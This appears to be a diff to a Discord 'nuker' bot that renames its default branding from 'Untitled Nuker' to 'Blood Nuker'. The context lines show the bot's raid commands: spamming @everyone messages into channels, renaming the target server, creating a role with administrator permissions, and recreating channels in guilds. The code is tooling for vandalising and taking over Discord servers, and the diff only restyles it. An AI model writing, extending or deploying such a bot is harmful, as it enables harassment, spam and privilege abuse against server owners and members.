@@ -485,7 +485,7 @@ async def spamToAllChannels(ctx, amount: int = 50, *, text="@everyone Untitled N
 
 @bot.command(name='7', aliases=["sc"])
 @commands.check(isWhitelisted)
-async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone Untitled Nuker"):
+async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone Blood Nuker"):
     await msg_delete(ctx)
     for i in range(amount):
         try:
@@ -561,7 +561,7 @@ async def editServerIcon(ctx):
 
 @bot.command(name='13', aliases=["sn"])
 @commands.check(isWhitelisted)
-async def editServerName(ctx, *, name="Untitled Nuker"):
+async def editServerName(ctx, *, name="Blood Nuker"):
     await msg_delete(ctx)
     try:
         await ctx.guild.edit(name=name)
@@ -572,7 +572,7 @@ async def editServerName(ctx, *, name="Untitled Nuker"):
 
 @bot.command(name="14", aliases=["ga"])
 @commands.check(isWhitelisted)
-async def getAdmin(ctx, *, rolename="Untitled Nuker"):
+async def getAdmin(ctx, *, rolename="Blood Nuker"):
     await msg_delete(ctx)
     try:
         perms = discord.Permissions(administrator=True)
@@ -590,7 +590,7 @@ async def reviveGuild(ctx, guildId: int = None):
     if guildId:
         guild = bot.get_guild(guildId)
         try:
-            await guild.create_text_channel(name="Untitled Nuker")
+            await guild.create_text_channel(name="Blood Nuker")
             print(f"{msgs['+']} Revived {guild}")
         except:
             print(f"{msgs['error']} Can't revive {guild}")
